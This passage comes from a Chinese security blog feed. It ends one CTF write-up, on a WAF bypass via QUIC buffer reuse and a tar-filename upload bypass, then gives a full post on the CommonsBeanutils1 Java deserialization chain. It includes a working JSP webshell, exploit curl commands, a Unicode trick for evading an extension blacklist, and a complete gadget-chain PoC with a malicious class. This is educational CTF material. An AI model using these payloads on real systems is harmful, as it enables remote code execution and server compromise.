D^3CTF 2025,I&#x27;m tidy quic in web.</span><br></pre></td></tr></table></figure><p>如果是POST请求，就根据<code>Content-Length</code><br>获取对应长度的请求体，存在<code>buf</code>里</p><p>如果buf以<code>I want</code>开头<br>且剩余的内容去除前后的空白后为<code>flag</code><br>就可以获取到返回到的flag</p><p>关键的特性在这个地方：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果 Content-Length 已知</span></span><br><span class="line">buf = p.Get(length)     <span class="comment">// 从缓冲区池中获取一个指定长度的字节切片</span></span><br><span class="line"><span class="keyword">defer</span> p.Put(buf)        <span class="comment">// 在函数返回前将缓冲区放回池中，避免内存泄漏</span></span><br><span class="line">    rd := textInterrupterWrap(r.Body) <span class="comment">// 包装请求体，以便进行内容检查</span></span><br></pre></td></tr></table></figure><p>虽然<code>p.Put</code>归还了缓冲区，使其可用<br>但是并不会删除它的数据<br>而waf检查的不是<code>buf</code>而是请求体本身<code>r.Body</code></p><p>那么我们可以发一次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\20889&gt;C:\Users\20889\scoop\shims\curl.exe -k --http3 https://35.241.98.126:31547/ -X POST -H &quot;Content-Length: 10&quot; -H &quot;Connection: keep-alive&quot; -d &quot;I wantflag&quot;</span><br><span class="line">WAF</span><br></pre></td></tr></table></figure><p>被waf，但是此时数据还存在buf里<br>这个内置机制似乎会过一小段时间自动释放<br>所以只要快速发出下一条</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\20889&gt;C:\Users\20889\scoop\shims\curl.exe -k --http3 https://35.241.98.126:31547/ -X POST -H &quot;Content-Length: 10&quot; -H &quot;Connection: keep-alive&quot; -d &quot;&quot;</span><br><span class="line">d3ctf&#123;Y0u-S@iD_RlghT_6Ut-YOu_SHoULD-P1ay_GeNshln-iMp@ct1&#125;</span><br></pre></td></tr></table></figure><p>就能拿到flag了<br>但这里第二次发送时要注意不要覆盖掉原有的结果<br>即<code>I want flag</code><br>这个结构，所以用空字符串最好</p><h3 id="jtar"><a href="#jtar" class="headerlink" title="jtar"></a>jtar</h3><p>看到是java题已经畏惧了<br>但还是只能知识学爆</p><p>首先学着写一个jsp马</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">JSP（Java Server Pages）是一种用于开发动态网页的技术，</span><br><span class="line">它允许开发者将Java代码嵌入到HTML页面中。</span><br><span class="line">JSP是基于Java Servlet技术的扩展，</span><br><span class="line">主要用于简化页面内容的动态生成。</span><br></pre></td></tr></table></figure><p>那么我就把它理解成php</p><p>语法似乎就是使用<code>&lt;%%&gt;</code>包裹<br>然后内部写<code>java</code>语法</p><p>这道题似乎没有对内容进行过滤，<br>所以抄一个最普通的有回显木马：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;一句话木马&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">&quot;password&quot;</span>.equals(request.getParameter(<span class="string">&quot;p&quot;</span>)))&#123;</span><br><span class="line">  <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">        response.getWriter().print(line);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>那么来具体看一下这道题的源码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> d3.example.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> d3.example.utils.BackUp;</span><br><span class="line"><span class="keyword">import</span> d3.example.utils.Upload;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/view&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">view</span><span class="params">(<span class="meta">@RequestParam</span> String page, HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (page.matches(<span class="string">&quot;^[a-zA-Z0-9-]+$&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">viewPath</span> <span class="operator">=</span> <span class="string">&quot;/WEB-INF/views/&quot;</span> + page + <span class="string">&quot;.jsp&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> request.getServletContext().getRealPath(viewPath);</span><br><span class="line">            <span class="type">File</span> <span class="variable">jspFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(realPath);</span><br><span class="line">            <span class="keyword">if</span> (realPath != <span class="literal">null</span> &amp;&amp; jspFile.exists()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(page);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mav</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        mav.addObject(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;The file don&#x27;t exist.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mav;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/Upload&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">UploadController</span><span class="params">(<span class="meta">@RequestParam</span> MultipartFile file)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="string">&quot;webapps/ROOT/WEB-INF/views&quot;</span>;</span><br><span class="line">            Set&lt;String&gt; blackList = <span class="keyword">new</span> <span class="title class_">HashSet</span>(Arrays.asList(<span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;jhtml&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;xml&quot;</span>, <span class="string">&quot;war&quot;</span>, <span class="string">&quot;jar&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> Upload.secureUpload(file, uploadDir, blackList);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Upload Success: &quot;</span> + filePath;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Upload.UploadException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;The file is forbidden: &quot;</span> + e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/BackUp&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">BackUpController</span><span class="params">(<span class="meta">@RequestParam</span> String op)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Objects.equals(op, <span class="string">&quot;tar&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                BackUp.tarDirectory(Paths.get(<span class="string">&quot;backup.tar&quot;</span>), Paths.get(<span class="string">&quot;webapps/ROOT/WEB-INF/views&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Success !&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Failure : tar Error&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Objects.equals(op, <span class="string">&quot;untar&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                BackUp.untar(Paths.get(<span class="string">&quot;webapps/ROOT/WEB-INF/views&quot;</span>), Paths.get(<span class="string">&quot;backup.tar&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Success !&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Failure : untar Error&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Failure : option Error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有三个接口</p><ul><li>View</li></ul><p>接收一个<code>page</code>参数<br>然后会返回对应的<code>views/&lt;page&gt;.jsp</code>文件</p><ul><li>Upload</li></ul><p>上传一个文件<br>过滤了有可能被当做jsp解析的所有文件</p><ul><li>BackUp</li></ul><p>接收一个<code>op</code>参数（操作）<br>如果值为<code>tar</code><br>就把views目录打包为一个<code>backup.tar</code><br>如果值为<code>untar</code><br>就把这个压缩包重新解压到views里</p><p>那么现在看来思路其实挺清晰的，<br>用后两个接口想办法传一个jsp马到views目录里<br>然后通过View接口去访问</p><p>看了很多wp说因为题目叫jtar所以问题肯定在这个解压操作里<br>其实这个我觉得不一定的，只是网站主要是这个功能而已<br>但是这道题确实是</p><p>到了这里又学到个新特性：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java中char的⼤⼩在\u0000-\uffff之间，</span><br><span class="line">⽽byte的⼤⼩在(-127)-128之间，所以当char的值在257时，</span><br><span class="line">被强制转换成byte，则会变成1，即ascii码为1对应的字符</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为 Java 中 char 的大小是 2 字节，</span><br><span class="line">范围是 0 ~ 65515（\u0000 ～ \uffff），</span><br><span class="line">而 byte 是 1 字节，范围是 -128 ~ 127，</span><br><span class="line">所以如果 char 超过了 256，就会发生数据截断，即只保留低 8 位</span><br><span class="line"></span><br><span class="line">所以就想找到一个字符在转换后变成 j、s、p 中的一个字符</span><br><span class="line">比如 j 二进制表示是 00000000 01101010，</span><br><span class="line">考虑加上一个数，使其低八位不变，只改变高八位</span><br><span class="line"></span><br><span class="line">即加上超过 8 位的数字（低八位全为 0）。</span><br><span class="line">比如 00000001 00000000，十进制为 256。</span><br><span class="line">相加后为 00000001 01101010。截断后，</span><br><span class="line">就是 01101010 即字符 “j” 了</span><br></pre></td></tr></table></figure><p>而jtar获取文件名的实现是通过这么一个函数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getNameBytes</span><span class="params">(StringBuffer name, <span class="type">byte</span>[] buf, <span class="type">int</span> offset, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length &amp;&amp; i &lt; name.length(); ++i) &#123;</span><br><span class="line">    buf[offset + i] = (<span class="type">byte</span>) name.charAt(i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (; i &lt; length; ++i) &#123;</span><br><span class="line">    buf[offset + i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> offset + length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就发生了上述需要的强制类型转换</p><p>那么只要使用python找到jsp对应的加256位的字符即可<br>不过这道题只需要换一个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chr(256+ord(&#x27;j&#x27;)) -&gt; Ū</span><br></pre></td></tr></table></figure><p>也就是<code>Ūsp</code><br>那么就传一个<code>Ūsp</code>马<br>然后打包再解包<br>最后上马即可<br>flag在env里</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d3ctf&#123;wh4T_?1_H0W-couID_YoU-D0-thAt_,-JTAr-?3d7c8d&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—CommonsBeanutils1</title>
      <link href="/2025/05/10/java-cb1/"/>
      <url>/2025/05/10/java-cb1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不是ccb</span><br><span class="line">是CommonsBeanutils</span><br></pre></td></tr></table></figure><p>上一篇学习了CC2中的<code>java.util.PriorityQueue</code><br>这个类会进行重排序操作触发比较<br>CB1链子的出现是为了找到另一个能够利用的比较器（除触发翻译链外）</p><h3 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h3><p>属性的封装完全符合标准的类叫<code>JavaBean</code><br>例如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isChild</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age &lt;= <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对</span><br><span class="line">象（也称为JavaBean）的一些操作方法。</span><br></pre></td></tr></table></figure><p>在<code>commons-beanutils</code>中提供了一个静态方法<code>PropertyUtils.getProperty</code>，<br>让使用者可以直接调用任意<code>JavaBean</code>的<code>getter</code>方法，比如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Person</span>(), <span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure><p>此时，<code>commons-beanutils</code>会自动找到<code>name</code>属性的<code>getter</code>方法，<br>也就是<code>getName</code>，然后调用，获得返回值。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(org.example.evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,</span><br><span class="line">                comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h3><p>可以看到poc中用到的就是这个<code>BeanComparator</code>比较器<br>这个比较器用于比较两个<code>JavaBean</code>是否相等<br>它的比较方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( <span class="keyword">final</span> T o1, <span class="keyword">final</span> T o2 )</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> internalCompare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> +</span><br><span class="line">        iae.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> +</span><br><span class="line">        ite.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> +</span><br><span class="line">        nsme.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的这个方法：<code>getProperty()</code>可以用来获取get封装函数<br>回忆之前的<code>TemplatesImpl</code>加载类的方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt;</span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt;</span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>这个方法：<code>getOutputProperties()</code><br>恰好符合以<code>get</code>开头的JavaBean封装函数的标准<br>那只要控制：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="string">&#x27;TemplatesImpl对象&#x27;</span>,<span class="string">&#x27;outputProperties&#x27;</span>);</span><br></pre></td></tr></table></figure><p>就可以调用到<code>TemplatesImpl.getOutputProperties()</code><br>加载恶意类</p><h3 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h3><p>这个恶意类必须要适用于<code>TemplatesImpl</code><br>也就是那时候讨论过的继承<code>AbstractTranslet</code><br>如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 恶意代码（例如执行命令）</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此一来就成功实现了命令执行</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—CommonsCollections2</title>
      <link href="/2025/05/10/java-cc2/"/>
      <url>/2025/05/10/java-cc2/</url>
      
        <content type="html"><![CDATA[<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">​​Apache Commons Collections 3.2.1 或 4.0​​（未修复版本）</span><br><span class="line">​​JDK ≤ 8u71​​（高版本JDK需结合其他入口类绕过）</span><br></pre></td></tr></table></figure><h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 